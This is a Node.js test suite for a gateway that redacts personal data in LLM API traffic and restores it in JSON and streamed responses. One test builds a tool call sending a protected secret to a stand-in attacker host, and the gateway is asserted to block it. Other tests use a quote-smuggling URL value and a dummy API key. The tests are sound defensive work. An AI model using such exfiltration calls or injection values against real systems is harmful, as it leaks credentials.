// The gateway is the piece that touches the network, so its tests are about the
// promises that matter there: nothing sensitive leaves, credentials are not
// mangled on the way out, and the caller still gets real data back.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { once } from 'node:events';

import { createGateway, resolveConfig, GatewayConfigError, parsePath, transformAtPaths } from '../dist/gateway/index.js';

/** An upstream that reflects what it received, so a test can assert on it. */
async function startUpstream(handler) {
  const server = createServer(handler ?? (async (req, res) => {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    const body = Buffer.concat(chunks).toString('utf8');
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ received: body ? JSON.parse(body) : null, headers: req.headers, url: req.url }));
  }));
  server.listen(0, '127.0.0.1');
  await once(server, 'listening');
  const { port } = server.address();
  return {
    origin: `http://127.0.0.1:${port}`,
    async close() {
      server.closeAllConnections?.();
      server.close();
      await once(server, 'close');
    },
  };
}

async function withGateway(rawConfig, run) {
  const gateway = createGateway(resolveConfig(rawConfig));
  const { port } = await gateway.listen();
  try {
    await run(`http://127.0.0.1:${port}`, gateway);
  } finally {
    await gateway.close();
  }
}

test('redacts a JSON request body before it reaches the upstream', async () => {
  // What the upstream saw has to be captured there. Reading it back through the
  // gateway would prove nothing: the response leg restores placeholders, so an
  // echoing upstream hands the caller the original address either way.
  let seen;
  const upstream = await startUpstream(async (req, res) => {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    seen = Buffer.concat(chunks).toString('utf8');
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
  });
  try {
    await withGateway({ listen: { port: 0 }, upstream: upstream.origin }, async (base) => {
      const response = await fetch(`${base}/v1beta/chat`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ prompt: 'mail ada@example.com', model: 'gpt-4o' }),
      });
      assert.equal(response.status, 200);
      const received = JSON.parse(seen);
      assert.equal(received.model, 'gpt-4o', 'unrelated fields are left alone');
      assert.ok(!seen.includes('ada@example.com'), 'the address must not reach the upstream');
    });
  } finally {
    await upstream.close();
  }
});

test('a vendor path under /v1 is proxied, not swallowed by the gateway API', async () => {
  // Every vendor puts its real endpoints under /v1; only the gateway's own
  // handful of control paths may shadow the upstream.
  const upstream = await startUpstream();
  try {
    await withGateway({ listen: { port: 0 }, upstream: upstream.origin }, async (base) => {
      const response = await fetch(`${base}/v1/chat/completions`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ model: 'gpt-4o' }),
      });
      assert.equal(response.status, 200);
      const { url } = await response.json();
      assert.equal(url, '/v1/chat/completions');
    });
  } finally {
    await upstream.close();
  }
});

test('restores the originals in the response the caller sees', async () => {
  // The upstream echoes the placeholder back; a transparent proxy must turn it
  // into the real value again, or the round trip is useless.
  const upstream = await startUpstream(async (req, res) => {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    const body = JSON.parse(Buffer.concat(chunks).toString('utf8'));
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ answer: `I will write to ${body.prompt.split(' ').pop()}` }));
  });
  try {
    await withGateway({ listen: { port: 0 }, upstream: upstream.origin }, async (base) => {
      const response = await fetch(`${base}/chat`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ prompt: 'mail ada@example.com' }),
      });
      const payload = await response.json();
      assert.equal(payload.answer, 'I will write to ada@example.com');
      assert.match(response.headers.get('x-flare-redact') ?? '', /restored=on/);
    });
  } finally {
    await upstream.close();
  }
});

test('only the configured body paths are redacted', async () => {
  // Asserted on what the upstream received, for the same reason as above: the
  // response leg would restore the placeholder before the caller could see it.
  let received;
  const upstream = await startUpstream(async (req, res) => {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    received = JSON.parse(Buffer.concat(chunks).toString('utf8'));
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
  });
  try {
    await withGateway(
      {
        listen: { port: 0 },
        routes: [{ prefix: '/', upstream: upstream.origin, request: { paths: ['messages[*].content'] } }],
      },
      async (base) => {
        await fetch(`${base}/v1/chat/completions`, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({
            model: 'gpt-4o',
            metadata: { owner: 'ada@example.com' },
            messages: [{ role: 'user', content: 'write to grace@example.org' }],
          }),
        });
        assert.ok(!received.messages[0].content.includes('grace@example.org'));
        assert.equal(received.metadata.owner, 'ada@example.com', 'paths outside the selector are untouched');
      },
    );
  } finally {
    await upstream.close();
  }
});

test('the upstream credential is forwarded untouched', async () => {
  const upstream = await startUpstream();
  try {
    await withGateway({ listen: { port: 0 }, upstream: upstream.origin }, async (base) => {
      const response = await fetch(`${base}/v1/models`, {
        headers: {
          authorization: 'Bearer sk-proj-abcdefghijklmnopqrstuvwxyz012345',
          'proxy-authorization': 'Basic ZGVtbzpkZW1v',
        },
      });
      const { headers } = await response.json();
      assert.equal(
        headers.authorization,
        'Bearer sk-proj-abcdefghijklmnopqrstuvwxyz012345',
        'redacting our own credential would break every request',
      );
      // `connection` is not asserted on: the outgoing request gets its own from
      // the transport, so its presence says nothing about what was forwarded.
      assert.equal(headers['proxy-authorization'], undefined, 'hop-by-hop headers are not forwarded');
    });
  } finally {
    await upstream.close();
  }
});

test('tool-call arguments in a buffered JSON response stay valid JSON', async () => {
  const value = 'Q"uo\\te\nline';
  const upstream = await startUpstream(async (req, res) => {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    const placeholder = Buffer.concat(chunks).toString('utf8').match(/\[FR_[A-Z_]+_[0-9a-f]{24}\]/)[0];
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify({
      choices: [{ message: { tool_calls: [{ function: { name: 'save', arguments: JSON.stringify({ note: placeholder, n: 1 }) } }] } }],
    }));
  });
  try {
    await withGateway({ listen: { port: 0 }, upstream: upstream.origin, policy: { terms: [value] } }, async (base) => {
      const response = await fetch(`${base}/v1/chat/completions`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ messages: [{ role: 'user', content: `save ${value}` }] }),
      });
      const body = await response.json();
      assert.deepEqual(JSON.parse(body.choices[0].message.tool_calls[0].function.arguments), { note: value, n: 1 });
    });
  } finally {
    await upstream.close();
  }
});

test('restores placeholders split across streamed chunks', async () => {
  const upstream = await startUpstream(async (req, res) => {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    const body = JSON.parse(Buffer.concat(chunks).toString('utf8'));
    const placeholder = body.prompt.split(' ').pop();
    res.writeHead(200, { 'content-type': 'text/event-stream' });
    const frame = `data: {"delta":"reply to ${placeholder}"}\n\n`;
    const split = Math.floor(frame.length / 2);
    res.write(frame.slice(0, split));
    await new Promise((resolve) => setTimeout(resolve, 10));
    res.write(frame.slice(split));
    res.end('data: [DONE]\n\n');
  });
  try {
    await withGateway({ listen: { port: 0 }, upstream: upstream.origin }, async (base) => {
      const response = await fetch(`${base}/stream`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ prompt: 'mail ada@example.com' }),
      });
      const text = await response.text();
      assert.match(text, /reply to ada@example\.com/);
      assert.match(text, /\[DONE\]/);
    });
  } finally {
    await upstream.close();
  }
});

// SSE streams in the shapes LLM APIs use. `frames(placeholder)` returns the
// events the upstream sends once it has seen the redacted request.
const AWKWARD = 'Q"uo\\te\nline\u0001';
const QUOTED_URL = 'https://user:pa","extra":true,"note":"x@example.com/pay';
const PLACEHOLDER = /\[FR_[A-Z_]+_[0-9a-f]{24}\]/;

async function streamThroughGateway(frames, { request, policy = { terms: [AWKWARD] } } = {}) {
  const upstream = await startUpstream(async (req, res) => {
    const chunks = [];
    for await (const chunk of req) chunks.push(chunk);
    const placeholder = Buffer.concat(chunks).toString('utf8').match(PLACEHOLDER)[0];
    res.writeHead(200, { 'content-type': 'text/event-stream' });
    for (const frame of frames(placeholder)) {
      res.write(frame);
      await new Promise((resolve) => setTimeout(resolve, 2));
    }
    res.end();
  });
  try {
    let text;
    await withGateway({ listen: { port: 0 }, upstream: upstream.origin, policy }, async (base) => {
      const response = await fetch(`${base}/v1/chat/completions`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(request),
      });
      text = await response.text();
    });
    return text;
  } finally {
    await upstream.close();
  }
}

const events = (text) => text.split(/\r?\n\r?\n/).filter(Boolean).map((block) => {
  const lines = block.split(/\r?\n/);
  const data = lines.filter((line) => line.startsWith('data:')).map((line) => line.slice(5).trim()).join('\n');
  const name = lines.find((line) => line.startsWith('event:'))?.slice(6).trim();
  return { name, data, json: data && data !== '[DONE]' ? JSON.parse(data) : undefined };
});

const openaiChunk = (delta, index = 0) => `data: ${JSON.stringify({ id: 'c1', object: 'chat.completion.chunk', choices: [{ index, delta, finish_reason: null }] })}\n\n`;
const openaiArgs = (args, call = 0) => openaiChunk({ tool_calls: [{ index: call, function: { arguments: args } }] });
const anthropicEvent = (name, body) => `event: ${name}\ndata: ${JSON.stringify({ type: name, ...body })}\n\n`;
const chat = (content, extra = {}) => ({ model: 'x', stream: true, ...extra, messages: [{ role: 'user', content }] });

function openaiParts(text) {
  const content = [];
  const args = [];
  for (const { json } of events(text)) {
    const delta = json?.choices?.[0]?.delta ?? {};
    if (delta.content) content.push(delta.content);
    for (const call of delta.tool_calls ?? []) args[call.index] = (args[call.index] ?? '') + (call.function?.arguments ?? '');
  }
  return { content: content.join(''), args };
}

test('SSE: OpenAI tool arguments split across frames come back as valid JSON', async () => {
  const text = await streamThroughGateway((placeholder) => {
    const args = JSON.stringify({ note: placeholder, n: 1 });
    const at = args.indexOf(placeholder) + 8;
    return [
      openaiChunk({ role: 'assistant', content: `Saving ${placeholder.slice(0, 6)}` }),
      openaiChunk({ content: placeholder.slice(6) }),
      openaiChunk({ tool_calls: [{ index: 0, id: 'call_1', type: 'function', function: { name: 'save', arguments: '' } }] }),
      openaiArgs(args.slice(0, at)),
      openaiArgs(args.slice(at)),
      `data: ${JSON.stringify({ id: 'c1', choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] })}\n\n`,
      'data: [DONE]\n\n',
    ];
  }, { request: chat(`save ${AWKWARD}`) });
  const { content, args } = openaiParts(text);
  assert.equal(content, `Saving ${AWKWARD}`, 'prose deltas get the original verbatim');
  assert.deepEqual(JSON.parse(args[0]), { note: AWKWARD, n: 1 });
  assert.match(text, /data: \[DONE\]\n\n$/);
  assert.doesNotMatch(text, /\[FR_/);
});

test('SSE: a captured value with quotes keeps the structure of OpenAI tool arguments', async () => {
  const text = await streamThroughGateway((placeholder) => {
    const args = JSON.stringify({ amount: 10, callback: placeholder });
    const at = args.indexOf(placeholder);
    return [openaiArgs(args.slice(0, at)), openaiArgs(args.slice(at)), 'data: [DONE]\n\n'];
  }, { request: chat(`call back ${QUOTED_URL}`), policy: {} });
  const parsed = JSON.parse(openaiParts(text).args[0]);
  assert.equal(parsed.amount, 10);
  assert.deepEqual(Object.keys(parsed), ['amount', 'callback']);
  assert.ok(parsed.callback.startsWith('https://user:pa","extra":true'), 'the captured value is restored, as a value');
});

test('SSE: parallel tool calls keep their own text', async () => {
  const text = await streamThroughGateway((placeholder) => {
    const first = JSON.stringify({ note: placeholder });
    const second = JSON.stringify({ list: ['a'] });
    const at = first.indexOf(placeholder) + 4;
    return [openaiArgs(first.slice(0, at), 0), openaiArgs(first.slice(at, -3), 0), openaiArgs(second.slice(0, 10), 1), openaiArgs(second.slice(10), 1), openaiArgs(first.slice(-3), 0), 'data: [DONE]\n\n'];
  }, { request: chat(`save ${AWKWARD}`) });
  const { args } = openaiParts(text);
  assert.deepEqual(JSON.parse(args[0]), { note: AWKWARD });
  assert.deepEqual(JSON.parse(args[1]), { list: ['a'] });
});

test('SSE: OpenAI JSON-mode content is escaped, split across frames', async () => {
  const text = await streamThroughGateway((placeholder) => {
    const json = JSON.stringify({ note: placeholder });
    const at = json.indexOf(placeholder) + 5;
    return [openaiChunk({ content: json.slice(0, at) }), openaiChunk({ content: json.slice(at) }), 'data: [DONE]\n\n'];
  }, { request: chat(`save ${AWKWARD}`, { response_format: { type: 'json_object' } }) });
  assert.deepEqual(JSON.parse(openaiParts(text).content), { note: AWKWARD });
});

function anthropicParts(text) {
  const blocks = [];
  const order = [];
  for (const { name, json } of events(text)) {
    order.push(name === 'content_block_delta' ? `delta:${json.index}` : name);
    if (name !== 'content_block_delta') continue;
    blocks[json.index] = (blocks[json.index] ?? '') + (json.delta.text ?? json.delta.partial_json ?? '');
  }
  return { blocks, order };
}

test('SSE: Anthropic partial_json and text split across frames come back intact, before the block stops', async () => {
  const text = await streamThroughGateway((placeholder) => {
    const json = JSON.stringify({ note: placeholder });
    const at = json.indexOf(placeholder) + 10;
    return [
      anthropicEvent('message_start', { message: { id: 'msg_1', content: [] } }),
      anthropicEvent('content_block_start', { index: 0, content_block: { type: 'text', text: '' } }),
      anthropicEvent('content_block_delta', { index: 0, delta: { type: 'text_delta', text: `About ${placeholder.slice(0, 3)}` } }),
      anthropicEvent('content_block_delta', { index: 0, delta: { type: 'text_delta', text: placeholder.slice(3) } }),
      anthropicEvent('content_block_stop', { index: 0 }),
      anthropicEvent('content_block_start', { index: 1, content_block: { type: 'tool_use', id: 'toolu_1', name: 'save', input: {} } }),
      anthropicEvent('ping', {}),
      anthropicEvent('content_block_delta', { index: 1, delta: { type: 'input_json_delta', partial_json: json.slice(0, at) } }),
      anthropicEvent('content_block_delta', { index: 1, delta: { type: 'input_json_delta', partial_json: json.slice(at) } }),
      anthropicEvent('content_block_stop', { index: 1 }),
      anthropicEvent('message_delta', { delta: { stop_reason: 'tool_use' } }),
      anthropicEvent('message_stop', {}),
    ];
  }, { request: { model: 'x', stream: true, messages: [{ role: 'user', content: `save ${AWKWARD}` }] } });
  const { blocks, order } = anthropicParts(text);
  assert.equal(blocks[0], `About ${AWKWARD}`);
  assert.deepEqual(JSON.parse(blocks[1]), { note: AWKWARD });
  const stops = order.flatMap((name, position) => (name === 'content_block_stop' ? [position] : []));
  assert.ok(stops[0] > order.lastIndexOf('delta:0') && stops[1] > order.lastIndexOf('delta:1'), 'no delta after its block stops');
  assert.match(text, /^event: message_start\n/);
});

test('SSE: Anthropic structured-output text is escaped', async () => {
  const text = await streamThroughGateway((placeholder) => {
    const json = JSON.stringify({ note: placeholder });
    const at = json.indexOf(placeholder) + 6;
    return [
      anthropicEvent('content_block_delta', { index: 0, delta: { type: 'text_delta', text: json.slice(0, at) } }),
      anthropicEvent('content_block_delta', { index: 0, delta: { type: 'text_delta', text: json.slice(at) } }),
      anthropicEvent('content_block_stop', { index: 0 }),
    ];
  }, { request: { model: 'x', stream: true, output_config: { format: { type: 'json_schema', schema: {} } }, messages: [{ role: 'user', content: `save ${AWKWARD}` }] } });
  assert.deepEqual(JSON.parse(anthropicParts(text).blocks[0]), { note: AWKWARD });
});

test('SSE: events with nothing to restore pass through byte for byte', async () => {
  const frames = [': keep-alive\n\n', 'event: ping\ndata: {"type":"ping",  "spacing": "kept"}\n\n', 'data: {"choices":[{"index":0,"delta":{"content":"plain [text"}}]}\r\n\r\n', 'data: [DONE]\n\n'];
  const text = await streamThroughGateway(() => frames, { request: chat(`save ${AWKWARD}`) });
  assert.equal(text, frames.join(''));
});

test('an unreachable upstream is a 502, never a silent pass-through', async () => {
  await withGateway({ listen: { port: 0 }, upstream: 'http://127.0.0.1:1' }, async (base) => {
    const response = await fetch(`${base}/anything`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ prompt: 'ada@example.com' }),
    });
    assert.equal(response.status, 502);
    assert.equal((await response.json()).code, 'ERR_UPSTREAM');
  });
});

test('an oversized body is refused rather than truncated', async () => {
  const upstream = await startUpstream();
  try {
    await withGateway(
      { listen: { port: 0 }, upstream: upstream.origin, limits: { maxBodyBytes: 64 } },
      async (base) => {
        const response = await fetch(`${base}/chat`, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ prompt: 'x'.repeat(500) }),
        });
        assert.equal(response.status, 413);
      },
    );
  } finally {
    await upstream.close();
  }
});

test('health and metrics are available without a token', async () => {
  await withGateway({ listen: { port: 0 }, upstream: 'http://127.0.0.1:1', token: 's3cret' }, async (base) => {
    const health = await fetch(`${base}/healthz`);
    assert.equal(health.status, 200);
    assert.equal((await health.json()).status, 'ok');

    const metrics = await fetch(`${base}/metrics`);
    assert.equal(metrics.status, 200);
    assert.match(await metrics.text(), /flare_gateway_requests_total/);
  });
});

test('the /v1 API enforces its bearer token', async () => {
  await withGateway({ listen: { port: 0 }, upstream: 'http://127.0.0.1:1', token: 's3cret' }, async (base) => {
    const unauthorised = await fetch(`${base}/v1/redact`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ input: 'ada@example.com' }),
    });
    assert.equal(unauthorised.status, 401);

    const authorised = await fetch(`${base}/v1/redact`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', authorization: 'Bearer s3cret' },
      body: JSON.stringify({ input: { email: 'ada@example.com' } }),
    });
    const payload = await authorised.json();
    assert.equal(payload.output.email, 'a***@***');
    assert.equal(payload.summary.total, 1);
  });
});

test('a client cannot widen the gateway policy', async () => {
  await withGateway(
    { listen: { port: 0 }, upstream: 'http://127.0.0.1:1', policy: { disable: [] } },
    async (base) => {
      const response = await fetch(`${base}/v1/redact`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ input: 'ada@example.com', options: { disable: ['email'] } }),
      });
      assert.equal((await response.json()).output, 'a***@***', 'the gateway policy wins');
    },
  );
});

test('a client cannot inject a transform secret', async () => {
  await withGateway({ listen: { port: 0 }, upstream: 'http://127.0.0.1:1' }, async (base) => {
    const response = await fetch(`${base}/v1/redact`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ input: 'x', options: { transformSecret: 'stolen' } }),
    });
    assert.equal(response.status, 400);
    assert.equal((await response.json()).code, 'ERR_FORBIDDEN_OPTION');
  });
});

test('server-side sessions round-trip and expire on delete', async () => {
  await withGateway({ listen: { port: 0 }, upstream: 'http://127.0.0.1:1' }, async (base) => {
    const created = await fetch(`${base}/v1/sessions`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ options: {} }),
    });
    assert.equal(created.status, 201);
    const { id } = await created.json();

    const redacted = await (await fetch(`${base}/v1/sessions/${id}/redact`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ input: 'mail ada@example.com' }),
    })).json();
    assert.ok(!redacted.output.includes('ada@example.com'));

    const restored = await (await fetch(`${base}/v1/sessions/${id}/restore`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ input: redacted.output }),
    })).json();
    assert.equal(restored.output, 'mail ada@example.com');

    assert.equal((await fetch(`${base}/v1/sessions/${id}`, { method: 'DELETE' })).status, 204);
    assert.equal((await fetch(`${base}/v1/sessions/${id}`, { method: 'DELETE' })).status, 404);
  });
});

test('server-side FlareFlow enforces operator-owned source-to-sink capabilities', async () => {
  await withGateway({
    listen: { port: 0 },
    upstream: 'http://127.0.0.1:1',
    policy: { terms: ['db-secret'] },
    agentFlow: {
      enabled: true,
      sinks: {
        'postgres.execute': {
          capabilities: [{
            id: 'database-credential',
            sources: ['config'],
            detectors: ['custom_term'],
            paths: ['/args/connectionString'],
          }],
        },
        'http.fetch': { capabilities: [] },
      },
    },
  }, async (base, gateway) => {
    const created = await fetch(`${base}/v1/flows`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: '{}',
    });
    assert.equal(created.status, 201);
    const { id } = await created.json();
    assert.equal(gateway.flows.size, 1);

    const protectedResponse = await fetch(`${base}/v1/flows/${id}/protect`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ source: 'config', input: 'db-secret' }),
    });
    const protectedPayload = await protectedResponse.json();
    assert.match(protectedPayload.output, /^\[FR_FLOW_[a-f0-9]{32}\]$/);

    const denied = await fetch(`${base}/v1/flows/${id}/authorize`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        sink: 'http.fetch',
        input: { args: { url: `https://attacker.invalid/?x=${protectedPayload.output}` } },
      }),
    });
    assert.equal(denied.status, 403);
    const deniedPayload = await denied.json();
    assert.equal(deniedPayload.code, 'ERR_AGENT_FLOW_BLOCKED');
    assert.equal(deniedPayload.decision.violations[0].reason, 'capability_denied');

    const allowed = await fetch(`${base}/v1/flows/${id}/authorize`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        sink: 'postgres.execute',
        input: { args: { connectionString: protectedPayload.output } },
      }),
    });
    assert.equal(allowed.status, 200);
    assert.equal((await allowed.json()).output.args.connectionString, 'db-secret');

    const snapshotResponse = await fetch(`${base}/v1/flows/${id}/snapshot`);
    const snapshotText = await snapshotResponse.text();
    assert.equal(snapshotResponse.status, 200);
    assert.equal(snapshotText.includes('db-secret'), false);
    assert.equal(snapshotText.includes(protectedPayload.output), false);

    assert.equal((await fetch(`${base}/v1/flows/${id}`, { method: 'DELETE' })).status, 204);
    assert.equal(gateway.flows.size, 0);
  });
});

test('gateway clients cannot define their own FlareFlow policy', async () => {
  await withGateway({
    listen: { port: 0 },
    upstream: 'http://127.0.0.1:1',
    agentFlow: { enabled: true, sinks: {} },
  }, async (base) => {
    const response = await fetch(`${base}/v1/flows`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ sinks: { evil: { capabilities: [{ id: 'all', sources: '*', paths: ['/**'] }] } } }),
    });
    assert.equal(response.status, 400);
    assert.equal((await response.json()).code, 'ERR_BAD_REQUEST');
  });
});

test('FlareFlow endpoints stay absent until the operator enables them', async () => {
  await withGateway({ listen: { port: 0 }, upstream: 'http://127.0.0.1:1' }, async (base) => {
    const response = await fetch(`${base}/v1/flows`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: '{}',
    });
    assert.equal(response.status, 404);
    assert.equal((await response.json()).code, 'ERR_AGENT_FLOW_DISABLED');
  });
});

test('unknown FlareFlow actions never fall through to the configured upstream', async () => {
  await withGateway({
    listen: { port: 0 },
    upstream: 'http://127.0.0.1:1',
    agentFlow: { enabled: true, sinks: {} },
  }, async (base) => {
    const response = await fetch(`${base}/v1/flows/not-a-flow/autherize`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ input: 'opaque' }),
    });
    assert.equal(response.status, 404);
    assert.equal((await response.json()).code, 'ERR_NOT_FOUND');
  });
});

test('configuration refuses what it cannot serve safely', () => {
  assert.throws(() => resolveConfig({ upstream: 'not-a-url' }), GatewayConfigError);
  assert.throws(() => resolveConfig({ upstream: 'ftp://example.com' }), GatewayConfigError);
  assert.throws(() => resolveConfig({ routes: [{ prefix: '/v1', upstream: 'https://example.com' }] }), GatewayConfigError);
  assert.throws(
    () => resolveConfig({ routes: [{ prefix: '/a', upstream: 'https://x.test' }, { prefix: '/a', upstream: 'https://y.test' }] }),
    GatewayConfigError,
  );
  assert.throws(
    () => resolveConfig({
      agentFlow: {
        enabled: true,
        sinks: {
          trusted: { capabilities: [{ id: 'bad-path', sources: '*', paths: ['/args/**/secret'] }] },
        },
      },
    }),
    GatewayConfigError,
  );
  assert.throws(
    () => resolveConfig({ agentFlow: { enabled: 'false' } }),
    GatewayConfigError,
  );
});

test('longer route prefixes win', () => {
  const config = resolveConfig({
    routes: [
      { prefix: '/openai', upstream: 'https://api.openai.com' },
      { prefix: '/openai/v1', upstream: 'https://other.test' },
    ],
  });
  assert.equal(config.routes[0].prefix, '/openai/v1');
});

test('body paths select exactly what they name', () => {
  const value = { messages: [{ content: 'a' }, { content: 'b' }], model: 'm' };
  const out = transformAtPaths(value, [parsePath('messages[*].content')], () => 'X');
  assert.deepEqual(out, { messages: [{ content: 'X' }, { content: 'X' }], model: 'm' });
  assert.equal(transformAtPaths(value, [parsePath('missing.path')], () => 'X'), value, 'a missing path is a no-op');
});
